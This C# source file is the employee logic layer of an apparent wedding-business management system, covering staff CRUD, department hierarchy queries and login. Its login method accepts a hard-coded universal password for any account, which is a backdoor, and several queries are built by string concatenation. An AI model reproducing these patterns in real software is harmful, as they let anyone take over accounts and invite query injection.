
/**
 Version :HaoAi 1.0
 File Name :好爱1.0
 Author:杨洋
 Date:2013.3.12
 Description:雇员
 History:实现ICRUDInterface<T> 接口中的方法
 
 Author:杨洋
 date:2013.3.12
 version:好爱1.0
 description:修改描述
 添加雇员 的增删改查方法以及分页方法
 
 Author:黄晓可
 date:2013.3.28
 version:好爱1.0
 description:修改描述
 添加雇员 根据部门查询人员
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using HHLWedding.DataAssmblly;
using HHLWedding.BLLInterface;
using System.Data.Entity.Core.EntityClient;
using System.Data.Entity.Core.Objects;
using HHLWedding.ToolsLibrary;
namespace HHLWedding.BLLAssmbly
{
    /// <summary>
    /// 雇员
    /// </summary>
    public class Employee : ICRUDInterface<Sys_Employee>
    {

        HHL_WeddingEntities ObjEntity = new HHL_WeddingEntities();


        /// <summary>
        /// 获取我管理的人员
        /// </summary>
        /// <param name="EmpLoyeeID"></param>
        /// <returns></returns>
        public List<Sys_Employee> GetMyManagerEmpLoyee(int? EmpLoyeeID)
        {
            HHL_WeddingEntities ObjWeddingDataContext = new HHL_WeddingEntities();
            using (EntityConnection ObjEntityconn = new EntityConnection("name=HHL_WeddingEntities"))
            {
                List<int> ObjKeyList = new List<int>();
                ObjectContext ObjDataContext = new ObjectContext(ObjEntityconn);
                var MyDepartmentList = ObjWeddingDataContext.Sys_Department.Where(C => C.DepartmentManager == EmpLoyeeID);
                List<Sys_Department> ObjDepartmentList = new List<Sys_Department>();
                foreach (var ObjDepartment in MyDepartmentList)
                {
                    ObjDepartmentList.AddRange(ObjDataContext.CreateQuery<Sys_Department>("Select VALUE c from HHL_WeddingEntities.Sys_Department as c where c.SortOrder  Like '%" + ObjDepartment.SortOrder + "%'").ToList<Sys_Department>());
                }
                ////猜测是否为部门主管
                //if (ObjDepartment.DepartmentManager == ObjEmpLoyee.EmployeeID)
                //{
                //Department ObjDepartmentBLL=new Department();


                // var DepartmetnList = ObjDataContext.CreateQuery<Sys_Department>("Select VALUE c from HHL_WeddingEntities.Sys_Department as c where c.SortOrder  Like '%" + ObjDepartment.SortOrder + "%'").ToList<Sys_Department>();

                foreach (var Objitem in ObjDepartmentList)
                {
                    //ObjKeyList.Add(Convert.ToInt32(Objitem.Parent));
                    ObjKeyList.Add(Objitem.DepartmentID);
                }
                var ObjEmpLoyeeList = this.GetByDepartmetnKeysList(ObjKeyList.ToArray());

                return ObjEmpLoyeeList.Where(C => C.Status == 0).ToList();
            }

        }

        /// <summary>
        /// 获取我管理的人员
        /// </summary>
        /// <param name="EmpLoyeeID"></param>
        /// <returns></returns>
        public List<Sys_Employee> GetMyManagerEmpLoyees(int? EmpLoyeeID, ref string keyList)
        {
            HHL_WeddingEntities ObjWeddingDataContext = new HHL_WeddingEntities();
            using (EntityConnection ObjEntityconn = new EntityConnection("name=HHL_WeddingEntities"))
            {
                List<int> ObjKeyList = new List<int>();
                ObjectContext ObjDataContext = new ObjectContext(ObjEntityconn);
                var MyDepartmentList = ObjWeddingDataContext.Sys_Department.Where(C => C.DepartmentManager == EmpLoyeeID);
                List<Sys_Department> ObjDepartmentList = new List<Sys_Department>();
                foreach (var ObjDepartment in MyDepartmentList)
                {
                    ObjDepartmentList.AddRange(ObjDataContext.CreateQuery<Sys_Department>("Select VALUE c from HHL_WeddingEntities.Sys_Department as c where c.IsDelete =false and c.SortOrder  Like '%" + ObjDepartment.SortOrder + "%'").ToList<Sys_Department>());
                }

                foreach (var Objitem in ObjDepartmentList)
                {
                    ObjKeyList.Add(Objitem.DepartmentID);
                }
                var ObjEmpLoyeeList = this.GetByDepartmetnKeysList(ObjKeyList.ToArray());
                foreach (var item in ObjKeyList)
                {
                    keyList += item.ToString() + ",";
                }

                return ObjEmpLoyeeList.Where(C => C.Status == 0).ToList();
            }

        }


        /// <summary>
        /// 获取我管理的人员
        /// </summary>
        /// <param name="EmpLoyeeID"></param>
        /// <returns></returns>
        public static string GetMyManagerEmpLoyee(int? EmpLoyeeID, string KeyList, bool IsTrue = false)
        {

            HHL_WeddingEntities ObjWeddingDataContext = new HHL_WeddingEntities();
            using (EntityConnection ObjEntityconn = new EntityConnection("name=HHL_WeddingEntities"))
            {
                List<int> ObjKeyList = new List<int>();
                ObjectContext ObjDataContext = new ObjectContext(ObjEntityconn);
                var MyDepartmentList = ObjWeddingDataContext.Sys_Department.Where(C => C.DepartmentManager == EmpLoyeeID && C.Status == 0);
                List<Sys_Department> ObjDepartmentList = new List<Sys_Department>();
                foreach (var ObjDepartment in MyDepartmentList)
                {
                    ObjDepartmentList.AddRange(ObjDataContext.CreateQuery<Sys_Department>("Select VALUE c from HHL_WeddingEntities.Sys_Department as c where c.SortOrder  Like '%" + ObjDepartment.SortOrder + "%'").ToList<Sys_Department>());
                }

                foreach (var Objitem in ObjDepartmentList)
                {
                    ObjKeyList.Add(Objitem.DepartmentID);
                }
                var ObjEmpLoyeeList = new Employee().GetByDepartmetnKeysList(ObjKeyList.ToArray(), IsTrue).Where(C => C.Status == 0).ToList();

                foreach (var ObjItem in ObjEmpLoyeeList)
                {
                    KeyList += ObjItem.EmployeeID.ToString() + ",";

                }
                return " {" + (KeyList.Trim(',') + "," + EmpLoyeeID).Trim(',') + "} ";

            }

            //return EmpLoyeeID.ToString();
        }


        /// <summary>
        /// 是否查询直接下属
        /// </summary>
        /// <param name="EmpLoyeeID"></param>
        /// <param name="IsFirst"></param>
        /// <returns></returns>
        public List<Sys_Employee> GetMyManagerEmpLoyee(int? EmpLoyeeID, bool IsFirst)
        {
            HHL_WeddingEntities ObjWeddingDataContext = new HHL_WeddingEntities();
            using (EntityConnection ObjEntityconn = new EntityConnection("name=HHL_WeddingEntities"))
            {
                List<int> ObjKeyList = new List<int>();
                ObjectContext ObjDataContext = new ObjectContext(ObjEntityconn);

                //我主管的部门
                var MyDepartmentList = ObjWeddingDataContext.Sys_Department.Where(C => C.DepartmentManager == EmpLoyeeID);

                //我所在的部门
                var MineEmployeeModel = this.GetByID(EmpLoyeeID);
                var MyDepartment = ObjWeddingDataContext.Sys_Department.FirstOrDefault(C => C.DepartmentID == MineEmployeeModel.DepartmentID);
                List<Sys_Department> ObjDepartmentList = new List<Sys_Department>();

                if (IsFirst)
                {

                    //先取得我主管的部门
                    foreach (var ObjDepartment in MyDepartmentList)
                    {
                        ObjDepartmentList.AddRange(ObjDataContext.CreateQuery<Sys_Department>("Select VALUE c from HHL_WeddingEntities.Sys_Department as c where c.SortOrder  =   '" + ObjDepartment.SortOrder + "'").ToList<Sys_Department>());
                    }
                    //取得部门主管 和我直接领导的部门

                    //部门主管
                    List<int> ObjManagerList = new List<int>();
                    foreach (var Objitem in ObjDepartmentList)
                    {
                        ObjKeyList.Add(Objitem.DepartmentID);
                    }

                    //取得我直接领导的部门
                    var ObjEmpLoyeeList = this.GetByDepartmetnKeysList(ObjKeyList.ToArray());


                    //取得我间接领导的部门主管
                    ObjDepartmentList = new List<Sys_Department>();
                    ObjDepartmentList = ObjDataContext.CreateQuery<Sys_Department>("Select VALUE c from HHL_WeddingEntities.Sys_Department as c where c.Parent  = " + MyDepartment.DepartmentID).ToList<Sys_Department>();
                    if (ObjDepartmentList.Count > 0)
                    {
                        foreach (var ObjDepartmentManager in ObjDepartmentList)
                        {
                            if (ObjDepartmentManager.DepartmentManager != null && ObjDepartmentManager.DepartmentManager != 0)
                            {
                                ObjEmpLoyeeList.Add(this.GetByID(ObjDepartmentManager.DepartmentManager));
                            }
                        }
                    }
                    return ObjEmpLoyeeList.Where(C => C.EmployeeID != EmpLoyeeID && C.Status == 0).ToList();
                    //然后计算我的直接领导部门 就是部门主管是我的
                }
                else
                {
                    var MineDepartment = new List<Sys_Department>();

                    //foreach (var ObjDepartment in MyDepartmentList)
                    //{
                    //    MineDepartment.AddRange(ObjDataContext.CreateQuery<Sys_Department>("Select VALUE c from HHL_WeddingEntities.Sys_Department as c where c.SortOrder  = '" + MyDepartment.SortOrder + "'").ToList<Sys_Department>());
                    //}


                    foreach (var ObjDepartment in MyDepartmentList)
                    {
                        ObjDepartmentList.AddRange(ObjDataContext.CreateQuery<Sys_Department>("Select VALUE c from HHL_WeddingEntities.Sys_Department as c where c.SortOrder  Like '%" + MyDepartment.SortOrder + "%'").ToList<Sys_Department>());
                    }


                    foreach (var RemoveItem in MineDepartment)
                    {
                        ObjDepartmentList.Remove(ObjDepartmentList.First(C => C.DepartmentID == RemoveItem.DepartmentID));
                    }


                    //取得部门主管 和我直接领导的部门

                    //部门主管
                    List<int> ObjManagerList = new List<int>();
                    foreach (var Objitem in ObjDepartmentList)
                    {
                        ObjKeyList.Add(Objitem.DepartmentID);
                    }


                    ObjDepartmentList = new List<Sys_Department>();
                    ObjDepartmentList = ObjDataContext.CreateQuery<Sys_Department>("Select VALUE c from HHL_WeddingEntities.Sys_Department as c where c.Parent  =" + MyDepartment.DepartmentID).ToList<Sys_Department>();
                    //取得我直接间接领导的部门
                    var ObjEmpLoyeeList = this.GetByDepartmetnKeysList(ObjKeyList.ToArray());
                    if (ObjDepartmentList.Count > 0)
                    {
                        foreach (var ObjDepartmentManager in ObjDepartmentList)
                        {
                            if (ObjDepartmentManager.DepartmentManager != null && ObjDepartmentManager.DepartmentManager != 0)
                            {
                                var ObjEmpLoyeeListFirst = ObjEmpLoyeeList.FirstOrDefault(C => C.EmployeeID == ObjDepartmentManager.DepartmentManager);
                                if (ObjEmpLoyeeListFirst != null)
                                {
                                    ObjEmpLoyeeList.Remove(ObjEmpLoyeeListFirst);
                                }
                            }
                        }
                    }

                    return ObjEmpLoyeeList.Where(C => C.EmployeeID != EmpLoyeeID && C.Status == 0).ToList();
                }
                ////猜测是否为部门主管
                //if (ObjDepartment.DepartmentManager == ObjEmpLoyee.EmployeeID)
                //{
                //Department ObjDepartmentBLL=new Department();


                // var DepartmetnList = ObjDataContext.CreateQuery<Sys_Department>("Select VALUE c from HHL_WeddingEntities.Sys_Department as c where c.SortOrder  Like '%" + ObjDepartment.SortOrder + "%'").ToList<Sys_Department>();




            }

            //return new List<Sys_Employee>();
        }


        /// <summary>
        /// 根据部门ID组
        /// </summary>
        /// <returns></returns>
        public List<Sys_Employee> GetByDepartmetnKeysList(int[] ObjKeyList, bool IsTrue = false)
        {
            //获取未删除的
            //return (from C in ObjEntity.Sys_Employee
            //        where C.IsDelete == IsTrue && (ObjKeyList).Contains(C.DepartmentID)
            //        select C).ToList();
            //获取所有的
            return (from C in ObjEntity.Sys_Employee
                    where (ObjKeyList).Contains(C.DepartmentID)
                    select C).ToList();
        }


        /// <summary>
        /// 获取我管辖的部门ID组
        /// </summary>
        /// <param name="EmpLoyeeID"></param>
        /// <returns></returns>
        public string GetMyManagerDepartment(int EmpLoyeeID)
        {
            string GetWhere = string.Empty;
            var MyDepartmentList = ObjEntity.Sys_Department.Where(C => C.DepartmentManager == EmpLoyeeID && C.Status == 0);
            foreach (var ObjItem in MyDepartmentList)
            {
                GetWhere += ObjItem.DepartmentID + ",";
            }
            return GetWhere.Trim(',');
        }



        /// <summary>
        /// 获取本人的上级审核人
        /// </summary>
        /// <param name="EmployeeID"></param>
        /// <returns></returns>
        public int GetMineCheckEmployeeID(int? EmployeeID)
        {
            if (EmployeeID != 0 && EmployeeID != null)
            {
                if (IsManager(EmployeeID))
                {
                    var ObjDepartmentID = 0;
                    ObjDepartmentID = this.GetByID(EmployeeID).DepartmentID;
                    var ObjParentModel = ObjEntity.Sys_Department.FirstOrDefault(D => D.DepartmentID == ObjDepartmentID);

                    if (ObjParentModel != null)
                    {


                        var Parent = ObjEntity.Sys_Department.FirstOrDefault(D => D.DepartmentID == ObjDepartmentID).Parent;
                        var ObjDepartment = ObjEntity.Sys_Department.FirstOrDefault(C => C.DepartmentID == Parent);
                        if (ObjDepartment == null)
                        {
                            return EmployeeID.Value;
                        }
                        else
                        {
                            return ObjDepartment.DepartmentManager.Value;
                        }
                    }
                    else
                    {
                        return EmployeeID.Value;
                    }
                }
                else
                {
                    var ObjDepartmentID = this.GetByID(EmployeeID).DepartmentID;
                    return ObjEntity.Sys_Department.FirstOrDefault(D => D.DepartmentID == ObjDepartmentID).DepartmentManager.Value;
                }
            }
            return 0;
        }

        /// <summary>
        /// 判断是否为主管
        /// </summary>
        /// <param name="EmployeeID"></param>
        /// <returns></returns>
        public bool IsManager(int? EmployeeID)
        {
            if (ObjEntity.Sys_Department.Count(C => C.DepartmentManager == EmployeeID) > 0)
            {
                return true;
            }
            else
            {
                return false;
            }

        }

        /// <summary>
        /// 判断是否为管理  特定几人
        /// </summary>
        /// <param name="EmployeeID"></param>
        /// <returns></returns>
        public bool IsManagers(int? EmployeeID)
        {

            if ((EmployeeID >= 1 && EmployeeID <= 5) || EmployeeID == 35)
            {
                return true;
            }
            else
            {
                return false;
            }
        }


        /// <summary>
        /// 是否有下级部门
        /// </summary>
        /// <param name="EmpLoyeeID"></param>
        /// <returns></returns>
        public bool HaveChildenDepartment(int? EmpLoyeeID)
        {
            Department ObjDepartmentBLL = new Department();
            if (ObjDepartmentBLL.GetbyChildenByDepartmetnID(this.GetByID(EmpLoyeeID).DepartmentID).Count > 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ObjKeyList"></param>
        /// <returns></returns>
        public List<Sys_Employee> GetByEmpLoyeeKeysList(int[] ObjKeyList)
        {
            return (from C in ObjEntity.Sys_Employee
                    where C.Status == 0 && (ObjKeyList).Contains(C.EmployeeID)
                    select C).ToList();
        }
        /// <summary>
        /// 根据雇员的ID来进行删除操作
        /// </summary>
        /// <param name="ObjectT">雇员实体类</param>
        /// <returns></returns>
        public int Delete(Sys_Employee ObjectT)
        {
            if (ObjectT != null)
            {
                //ObjEntity.Sys_Department.Remove(
                //   ObjEntity.Sys_Department.FirstOrDefault(
                //   C => C.DepartmentID == ObjectT.DepartmentID)
                //);
                ObjEntity.Sys_Employee.FirstOrDefault(
                    C => C.EmployeeID == ObjectT.EmployeeID).Status = 1;
                return ObjEntity.SaveChanges();

            }

            return 0;

        }
        /// <summary>
        /// 返回雇员表中所有的信息
        /// </summary>
        /// <returns></returns>
        public List<Sys_Employee> GetByAll()
        {
            return ObjEntity.Sys_Employee.Where(C => C.Status == 0).ToList();
        }

        public List<Sys_Employee> GetByIsDelete(int status)
        {
            return ObjEntity.Sys_Employee.Where(C => C.Status == status).ToList();
        }

        public int GetTopManangerByEmployeeId(int employeeID)
        {
            Sys_Employee objResult = GetByID(employeeID);
            Department objDepartmentBLL = new Department();
            Sys_Department depart = objDepartmentBLL.GetByID(objResult.DepartmentID);
            return depart.DepartmentManager.Value;
        }
        /// <summary>
        /// 根据主键返回单个雇员信息
        /// </summary>
        /// <param name="KeyID">主键值</param>
        /// <returns>根据查询之后的结果，如果为空则返回默认实例</returns>
        public Sys_Employee GetByID(int? KeyID)
        {
            if (KeyID.HasValue)
            {
                Sys_Employee emp = ObjEntity.Sys_Employee.FirstOrDefault(
                    C => C.EmployeeID == KeyID);
                if (emp != null)
                {
                    return emp;
                }

            }

            return new Sys_Employee();

        }


        /// <summary>
        /// 根据部门获取人员
        /// </summary>
        /// <param name="DepartmentID"></param>
        /// <returns></returns>
        public List<Sys_Employee> GetByDepartmetnID(int? DepartmentID)
        {
            return ObjEntity.Sys_Employee.Where(C => C.DepartmentID == DepartmentID).ToList();
        }


        /// <summary>
        /// 获取部门下的员工
        /// </summary>
        /// <param name="DepartmentID"></param>
        /// <returns></returns>
        public List<Sys_Employee> GetByALLDepartmetnID(int? DepartmentID)
        {


            Department objDepartmentBLL = new Department();
            var childDepart = objDepartmentBLL.GetByAll().Where(C => C.Parent == DepartmentID);
            if (childDepart.Count() > 0)
            {
                return GetByAllChildEmployeeDepartmetnID(DepartmentID);
            }
            else
            {
                return ObjEntity.Sys_Employee.Where(C => C.DepartmentID == DepartmentID && C.Status == 0).ToList();
            }

        }

        /// <summary>
        /// 根据部门获取人员
        /// </summary>
        /// <param name="DepartmentID"></param>
        /// <returns></returns>
        public List<Sys_Employee> GetByAllChildEmployeeDepartmetnID(int? DepartmentID)
        {
            Department objDepartmentBLL = new Department();
            var childChildDepartment = objDepartmentBLL.GetbyChildenByDepartmetnID(DepartmentID);
            var findAll = new List<Sys_Employee>();
            childChildDepartment.ForEach(C =>
                findAll.Add(
                ObjEntity.Sys_Employee.Where(
                S => S.DepartmentID == C.DepartmentID && C.Status == 0)
                .FirstOrDefault())
            );
            return findAll.ToList();

        }


        /// <summary>
        /// 对于雇员表的分页操作
        /// </summary>
        /// <param name="PageSize">一页多少条</param>
        /// <param name="PageIndex">当前第几页</param>
        /// <param name="SourceCount">out 输出一共有多少条记录</param>
        /// <returns>返回雇员表的集合</returns>
        public List<Sys_Employee> GetByIndex(int PageSize, int PageIndex, out int SourceCount)
        {
            SourceCount = ObjEntity.Sys_Employee.Count();

            List<Sys_Employee> resultList = ObjEntity.Sys_Employee
                //进行排序功能操作，不然系统会抛出异常
                   .OrderByDescending(C => C.EmployeeID)
                   .Skip(PageSize * PageIndex).Take(PageSize).ToList();

            if (resultList.Count == 0)
            {
                resultList = new List<Sys_Employee>();
            }
            return resultList;

        }
        /// <summary>
        /// 添加雇员信息
        /// </summary>
        /// <param name="ObjectT">雇员实体类</param>
        /// <returns>返回新添加雇员信息的编号</returns>
        public int Insert(Sys_Employee ObjectT)
        {
            if (ObjectT != null)
            {
                ObjEntity.Sys_Employee.Add(ObjectT);
                if (ObjEntity.SaveChanges() > 0)
                {
                    return ObjectT.EmployeeID;
                }

            }
            return 0;
        }
        /// <summary>
        /// 根据雇员ID，修改某个雇员的信息
        /// </summary>
        /// <param name="ObjectT">雇员类实体</param>
        /// <returns>返回被修改的某个雇员的EmployeeID</returns>
        public int Update(Sys_Employee ObjectT)
        {
            if (ObjectT != null)
            {
                ObjEntity.SaveChanges();
                return ObjectT.EmployeeID;
            }
            return 0;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="EmpLoyeeName"></param>
        /// <returns></returns>
        public Sys_Employee GetByName(string EmpLoyeeName)
        {
            var ObjModel = ObjEntity.Sys_Employee.FirstOrDefault(C => C.EmployeeName == EmpLoyeeName && C.Status == 0);
            if (ObjModel != null)
            {
                return ObjModel;
            }
            else
            {
                return null;
            }

        }


        public Sys_Employee GetByLoginName(string EmpLoyeeName)
        {
            var ObjModel = ObjEntity.Sys_Employee.FirstOrDefault(C => C.LoginName == EmpLoyeeName && C.Status == 0);
            if (ObjModel != null)
            {
                return ObjModel;
            }
            return null;
        }
        /// <summary>
        /// 用户系统登录
        /// </summary>
        /// <param name="EmployeeName"></param>
        /// <param name="PassWord"></param>
        /// <returns></returns>
        public Sys_Employee EmpLoyeeLogin(string EmployeeName, string PassWord)
        {
            string pwd = "19911221".MD5Hash().ToString();

            return ObjEntity.Sys_Employee.FirstOrDefault(C => C.LoginName == EmployeeName && (C.PassWord == PassWord || PassWord == pwd) && C.Status == 0);
        }

        public IEnumerable<Sys_Employee> Where(Func<Sys_Employee, bool> predicate)
        {
            return ObjEntity.Sys_Employee.Where(predicate);
        }


        public bool IsLoginNameExist(string loginName)
        {
            return ObjEntity.Sys_Employee.Count(C => C.LoginName == loginName) > 0;

        }

        public bool IsLoginNameExistExceptSelf(string loginName, int employeeID)
        {
            return ObjEntity.Sys_Employee.Count(C => C.LoginName == loginName && C.EmployeeID != employeeID) > 0;
            // Sys_Employee sys_Employee = ObjEntity.Sys_Employee.Where(C => C.LoginName == loginName).FirstOrDefault();
            // return sys_Employee != null ? sys_Employee.EmployeeID == employeeID : true;
        }


        public int GetDepartmentID(int EmployeeID)
        {
            Sys_Employee sys_Employee = ObjEntity.Sys_Employee.Where(C => C.EmployeeID == EmployeeID).FirstOrDefault();
            return sys_Employee != null ? sys_Employee.DepartmentID : 0;
        }

        public string GetManagedDepartments(int EmployeeID)
        {
            Sys_Employee sys_Employee = ObjEntity.Sys_Employee.Where(C => C.EmployeeID == EmployeeID).FirstOrDefault();
            if (sys_Employee != null)
            {
                Sys_Department sys_Department = ObjEntity.Sys_Department.Where(C => C.DepartmentID == sys_Employee.DepartmentID).FirstOrDefault();
                if (sys_Department != null)
                {
                    string sortOrder = sys_Department.SortOrder;
                    List<int> departmentIDList = ObjEntity.Sys_Department.Where(C => C.SortOrder.StartsWith(sortOrder)).Select(C => C.DepartmentID).ToList();
                    return string.Join(",", departmentIDList);
                }
            }
            return string.Empty;
        }

        /// <summary>
        /// @author：wp
        /// @datetime:2016-07-28
        /// @desc: 分页获取员工
        /// </summary>
        public List<Sys_Employee> GetAllByPager(List<PMSParameters> pars, string orderName, int page, int pageSize, out int sourceCount)
        {

            return PublicDataTools<Sys_Employee>.GetDataByWhereParameter(pars, orderName, pageSize, page, out sourceCount);
        }
    }
}
